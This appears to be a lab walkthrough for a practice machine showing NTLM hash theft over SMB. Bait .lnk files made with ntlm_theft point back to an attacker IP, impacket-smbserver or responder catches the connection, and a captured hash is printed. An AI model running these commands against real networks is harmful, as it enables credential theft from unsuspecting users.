
If we have write permissions to an SMB Share, we can create an malicious file which connects back to our local running smb server, this should steal the NTLM Hash of the current user.

```
1. Create a malicious file that tries to connect back to us (to trigger NTLM authentication).
2. Set up a fake service. In our case we’ll set up SMB server.
3. Upload that malicious file and hope someone (a bot) clicks on it.”
4. gather the NTLM hash of the user who clicked on it.
```

1. To create malicious file, I used to use ntlm_theft.

```
git clone https://github.com/Greenwolf/ntlm_theft.git
```

2. Create an .lnk file which connects to our local ip.

```
python3 ntlm_theft.py -g all -s 10.10.14.57 -f hacked
```

3. Start up our smb server via impacket-smbserver OR responder

```
impacket-smbserver hack . -smb2support                                                                                                 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

If it doesn't work use responder.

```
responder -I tun0
```

4. Put our malicious file into the smb share.

```
smbclient \\\\vault.offsec/DocumentsShare
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> put vault.lnk 
putting file vault.lnk as \vault.lnk (27.4 kB/s) (average 27.4 kB/s)
```

Retrieved NTLM Hash.

```
[SMB] NTLMv2-SSP Client   : 192.168.126.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:df454169adb231b5:A4140F1A2BE91481804705DEC9287D73:010100000000000000F3BC28DE8DDC016E121B38345EBEA100000000020008005300520034004A0001001E00570049004E002D00300043005500570048004C004300390036005800320004003400570049004E002D00300043005500570048004C00430039003600580032002E005300520034004A002E004C004F00430041004C00030014005300520034004A002E004C004F00430041004C00050014005300520034004A002E004C004F00430041004C000700080000F3BC28DE8DDC01060004000200000008003000300000000000000001000000002000003481C105AABBDED8CF47612E7D057ED3B21F862780FA890B3DBE48A0FF2196D40A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320030000000000000000000 
```